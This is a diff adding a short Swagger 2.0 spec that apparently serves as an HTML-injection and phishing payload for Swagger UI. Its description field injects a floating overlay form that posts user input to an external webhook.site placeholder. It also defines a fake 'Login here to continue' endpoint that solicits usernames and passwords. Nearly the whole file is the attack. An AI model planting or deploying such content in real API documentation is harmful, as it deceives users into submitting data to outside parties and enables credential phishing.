@@ -1,0 +1,30 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: 'Swagger UI'
+  description: '<div style="position:fixed;bottom:20px;right:20px;width:300px;background:#fff;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,.35);z-index:99999;font-family:Arial;padding:16px;"><strong style="font-size:14px;">Rate this API documentation</strong><form action="https://webhook.site/REPLACE-ME" method="post"><div style="font-size:24px;margin:10px 0;">⭐⭐⭐⭐⭐</div><textarea name="feedback" rows="2" placeholder="Tell us more (optional)" style="width:100%;border:1px solid #ddd;border-radius:4px;padding:8px;"></textarea><button type="submit" style="width:100%;padding:9px;margin-top:8px;background:#0052cc;color:#fff;border:none;border-radius:4px;cursor:pointer;">Submit</button></form></div>'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to continue.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Bad request
+        '500':
+          description: Server error
